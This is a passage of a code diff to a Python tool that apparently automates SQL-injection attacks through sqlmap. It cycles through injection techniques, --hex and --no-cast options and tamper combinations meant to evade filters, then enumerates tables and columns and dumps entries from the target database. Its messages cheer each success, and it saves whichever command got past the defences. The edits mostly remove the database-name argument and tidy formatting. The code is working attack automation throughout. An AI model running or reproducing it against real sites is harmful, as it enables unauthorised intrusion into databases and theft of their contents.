-                        " --technique=USE" + " -D" + db_name + " --tables"
+                        " --technique=USE" + " --tables"
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
                     if sm_hex_or_no_cast_command in current_finished_command_list:
@@ -2143,14 +2207,14 @@ class Program(object):
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
                             self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表名" %
-                                    hex_or_no_cast,'red')
+                                                   hex_or_no_cast, 'red')
                             return 1
 
                 sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
-                    " --technique=BQT" + " -D" + db_name + " --tables"
+                    " --technique=BQT" + " --tables"
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if sm_hex_or_no_cast_command in current_finished_command_list:
@@ -2161,16 +2225,16 @@ class Program(object):
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
-                    table_name= self.get_table_name_from_log_file(self.log_file)
-                    if table_name!= 0 and table_name!= "":
+                    table_name = self.get_table_name_from_log_file(self.log_file)
+                    if table_name != 0 and table_name != "":
                         self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表名" %
-                                hex_or_no_cast,'red')
+                                               hex_or_no_cast, 'red')
                         return 1
 
-            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表名...",'green')
-            #在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
-            #先判断返回是否为0
-            db_type = eval(self.get_key_value_from_config_file(self.log_config_file,'default','db_type'))
+            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表名...", 'green')
+            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
+            # 先判断返回是否为0
+            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
             if db_type == 'MYSQL':
                 db_type_tamper_list = self.MYSQL
             elif db_type == 'MSSQL':
@@ -2208,14 +2272,12 @@ class Program(object):
     def get_column_name_need_tamper(self):
         # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
         # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
-        self.output.good_print("目前为止已经尝试完获取当前数据库的表名,现在尝试获取当前数据库的表的列名...",'red')
-        # 当前已经获得的数据库名,如下db_name
-        db_name = self.get_db_name_from_log_file(self.log_file)[0]
+        self.output.good_print("目前为止已经尝试完获取当前数据库的表名,现在尝试获取当前数据库的表的列名...", 'red')
         # 当前已经获得的表名,如下table_name
         table_name = self.get_table_name_from_log_file(self.log_file)
         has_column_name = self.get_column_name_from_log_file(self.log_file)
         if has_column_name == 1:
-            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表的列名了,以前已经得到过了",'red')
+            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表的列名了,以前已经得到过了", 'red')
             return 1
         else:
             # 之前没有得到数据库的表的列名,现在尝试所有的组合tamper获取数据库的表的列名,直到所有组合的tamper尝试完毕
@@ -2225,114 +2287,114 @@ class Program(object):
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                    if self.sm_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE" + " -D " +
-                                  db_name + " -T " + table_name + " --columns")
+                        self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE" + 
+                                                                 " -T " + table_name + " --columns")
                         current_finished_command_list.append(
-                            self.sm_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns")
+                            self.sm_command + " --technique=USE" + " -T " + table_name + " --columns")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
-                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名了",'red')
+                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名了", 'red')
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                if self.sm_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=BQT" + " -D " +
-                              db_name + " -T " + table_name + " --columns")
+                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=BQT" + 
+                                                             " -T " + table_name + " --columns")
                     current_finished_command_list.append(
-                        self.sm_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns")
+                        self.sm_command + " --technique=BQT" + " -T " + table_name + " --columns")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
                     has_column_name = self.get_column_name_from_log_file(self.log_file)
                     if has_column_name == 1:
-                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名了",'red')
+                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名了", 'red')
                         return 1
 
-                self.output.good_print("尝试用--hex选项再获取当前数据库的表的列名...",'green')
+                self.output.good_print("尝试用--hex选项再获取当前数据库的表的列名...", 'green')
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_hex_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                    if self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE" + " -D " +
-                                  db_name + " -T " + table_name + " --columns")
+                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
+                                                                 " -T " + table_name + " --columns")
                         current_finished_command_list.append(
-                            self.sm_hex_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns")
+                            self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --columns")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
-                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名",'red')
+                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名", 'red')
                             update_config_file_key_value(
                                 self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                if self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=BQT" + " -D " +
-                              db_name + " -T " + table_name + " --columns")
+                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
+                                                             " -T " + table_name + " --columns")
                     current_finished_command_list.append(
-                        self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns")
+                        self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --columns")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
                     has_column_name = self.get_column_name_from_log_file(self.log_file)
                     if has_column_name == 1:
-                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名", 'red')
                         update_config_file_key_value(
                             self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                         return 1
 
-                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表的列名...",'green')
+                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表的列名...", 'green')
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_no_cast_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                    if self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + " -D " +
-                                  db_name + " -T " + table_name + " --columns")
+                        self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
+                                                                 " -T " + table_name + " --columns")
                         current_finished_command_list.append(
-                            self.sm_no_cast_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --columns")
+                            self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --columns")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
-                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名",'red')
+                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名", 'red')
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'hex_or_no_cast', ['--no-cast'])
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_no_cast_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns" in current_finished_command_list:
+                if self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + " -D " +
-                              db_name + " -T " + table_name + " --columns")
+                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
+                                                             " -T " + table_name + " --columns")
                     current_finished_command_list.append(
-                        self.sm_no_cast_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --columns")
+                        self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --columns")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
                     has_column_name = self.get_column_name_from_log_file(self.log_file)
                     if has_column_name == 1:
-                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名", 'red')
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
                         return 1
@@ -2343,7 +2405,7 @@ class Program(object):
                     self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                 if self.has_good_sqli_type == 1:
                     sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
-                        " --technique=USE" + " -D" + db_name + " -T " + table_name + " --columns"
+                        " --technique=USE" + " -T " + table_name + " --columns"
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
                     if sm_hex_or_no_cast_command in current_finished_command_list:
@@ -2356,11 +2418,11 @@ class Program(object):
 
                         has_column_name = self.get_column_name_from_log_file(self.log_file)
                         if has_column_name == 1:
-                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名" % hex_or_no_cast,'red')
+                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名" % hex_or_no_cast, 'red')
                             return 1
 
                 sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
-                    " --technique=BQT" + " -D" + db_name + " -T " + table_name + " --columns"
+                    " --technique=BQT" + " -T " + table_name + " --columns"
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if sm_hex_or_no_cast_command in current_finished_command_list:
@@ -2374,13 +2436,13 @@ class Program(object):
                     has_column_name = self.get_column_name_from_log_file(self.log_file)
                     if has_column_name == 1:
                         self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名" %
-                                hex_or_no_cast,'red')
+                                               hex_or_no_cast, 'red')
                         return 1
 
-            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表的列名...",'green')
-            #在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
-            #先判断返回是否为0
-            db_type = eval(self.get_key_value_from_config_file(self.log_config_file,'default','db_type'))
+            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表的列名...", 'green')
+            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
+            # 先判断返回是否为0
+            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
             if db_type == 'MYSQL':
                 db_type_tamper_list = self.MYSQL
             elif db_type == 'MSSQL':
@@ -2418,14 +2480,12 @@ class Program(object):
     def get_entries_need_tamper(self):
         # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
         # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
-        self.output.good_print("目前为止已经尝试完获取当前数据库的表的列名,现在尝试获取当前数据库的表的列名的具体数据...",'red')
-        # 当前已经获得的数据库名,如下db_name
-        db_name = self.get_db_name_from_log_file(self.log_file)[0]
+        self.output.good_print("目前为止已经尝试完获取当前数据库的表的列名,现在尝试获取当前数据库的表的列名的具体数据...", 'red')
         # 当前已经获得的表名,如下table_name
         table_name = self.get_table_name_from_log_file(self.log_file)
         has_entries = self.get_entries_from_log_file(self.log_file)
         if has_entries == 1:
-            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表的列名的具体数据了,以前已经得到过了",'red')
+            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表的列名的具体数据了,以前已经得到过了", 'red')
             return 1
         else:
             # 之前没有得到数据库的表的列名的具体数据,现在尝试所有的组合tamper获取数据库的表的列名的具体数据,直到所有组合的tamper尝试完毕
@@ -2435,126 +2495,126 @@ class Program(object):
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                    if self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE" + " -D " +
-                                  db_name + " -T " + table_name + " --dump --stop 3")
+                        self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE" + 
+                                                                 " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
-                            self.sm_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                            self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_entries = self.get_entries_from_log_file(self.log_file)
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                         self.sm_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名的具体数据了",'red')
+                                                         self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
+                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名的具体数据了", 'red')
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                if self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=BQT" + " -D " +
-                              db_name + " -T " + table_name + " --dump --stop 3")
+                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=BQT" + 
+                                                             " -T " + table_name + " --dump --stop 3")
                     current_finished_command_list.append(
-                        self.sm_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                        self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
                     has_entries = self.get_entries_from_log_file(self.log_file)
                     if has_entries == 1:
                         update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                     self.sm_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名的具体数据了",'red')
+                                                     self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
+                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名的具体数据了", 'red')
                         return 1
 
-                self.output.good_print("尝试用--hex选项再获取当前数据库的表的列名的具体数据...",'green')
+                self.output.good_print("尝试用--hex选项再获取当前数据库的表的列名的具体数据...", 'green')
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_hex_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                    if self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE" + " -D " +
-                                  db_name + " -T " + table_name + " --dump --stop 3")
+                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
+                                                                 " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
-                            self.sm_hex_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                            self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_entries = self.get_entries_from_log_file(self.log_file)
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                         self.sm_hex_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名的具体数据",'red')
+                                                         self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
+                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名的具体数据", 'red')
                             update_config_file_key_value(
                                 self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                if self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=BQT" + " -D " +
-                              db_name + " -T " + table_name + " --dump --stop 3")
+                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
+                                                             " -T " + table_name + " --dump --stop 3")
                     current_finished_command_list.append(
-                        self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                        self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
                     has_entries = self.get_entries_from_log_file(self.log_file)
                     if has_entries == 1:
                         update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                     self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名的具体数据",'red')
+                                                     self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
+                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名的具体数据", 'red')
                         update_config_file_key_value(
                             self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                         return 1
 
-                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表的列名的具体数据...",'green')
+                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表的列名的具体数据...", 'green')
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_no_cast_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                    if self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + " -D " +
-                                  db_name + " -T " + table_name + " --dump --stop 3")
+                        self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
+                                                                 " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
-                            self.sm_no_cast_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                            self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_entries = self.get_entries_from_log_file(self.log_file)
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                         self.sm_no_cast_command + " --technique=USE" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名的具体数据",'red')
+                                                         self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
+                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名的具体数据", 'red')
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'hex_or_no_cast', ['--no-cast'])
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_no_cast_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                if self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + " -D " +
-                              db_name + " -T " + table_name + " --dump --stop 3")
+                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
+                                                             " -T " + table_name + " --dump --stop 3")
                     current_finished_command_list.append(
-                        self.sm_no_cast_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                        self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
                     has_entries = self.get_entries_from_log_file(self.log_file)
                     if has_entries == 1:
                         update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                     self.sm_no_cast_command + " --technique=BQT" + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
-                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名的具体数据",'red')
+                                                     self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
+                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名的具体数据", 'red')
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
                         return 1
@@ -2565,7 +2625,7 @@ class Program(object):
                     self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                 if self.has_good_sqli_type == 1:
                     sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
-                        " --technique=USE" + " -D" + db_name + " -T " + table_name + " --dump --stop 3"
+                        " --technique=USE" + " -T " + table_name + " --dump --stop 3"
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
                     if sm_hex_or_no_cast_command in current_finished_command_list:
@@ -2580,11 +2640,12 @@ class Program(object):
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'bypassed_command', [sm_hex_or_no_cast_command])
-                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名的具体数据" % hex_or_no_cast,'red')
+                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名的具体数据" %
+                                                   hex_or_no_cast, 'red')
                             return 1
 
                 sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
-                    " --technique=BQT" + " -D" + db_name + " -T " + table_name + " --dump --stop 3"
+                    " --technique=BQT" + " -T " + table_name + " --dump --stop 3"
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if sm_hex_or_no_cast_command in current_finished_command_list:
@@ -2599,13 +2660,14 @@ class Program(object):
                     if has_entries == 1:
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'bypassed_command', [sm_hex_or_no_cast_command])
-                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名的具体数据" % hex_or_no_cast,'red')
+                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名的具体数据" %
+                                               hex_or_no_cast, 'red')
                         return 1
 
-            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表的列名的具体数据...",'green')
-            #在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
-            #先判断返回是否为0
-            db_type = eval(self.get_key_value_from_config_file(self.log_config_file,'default','db_type'))
+            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表的列名的具体数据...", 'green')
+            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
+            # 先判断返回是否为0
+            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
             if db_type == 'MYSQL':
                 db_type_tamper_list = self.MYSQL
             elif db_type == 'MSSQL':
@@ -2640,7 +2702,7 @@ class Program(object):
             # 下面代表尝试完当前的动作依然没有得到当前url的数据库的表的列名的具体数据
             return 0
 
-    def check_log_has_content(self,log_file):
+    def check_log_has_content(self, log_file):
         # 检测log_file是否为空
         if os.path.exists(log_file) == False:
             print("log_file not exists")
@@ -2652,6 +2714,5 @@ class Program(object):
         else:
             return False
 
-if __name__=='__main__':
+if __name__ == '__main__':
     Program()
-
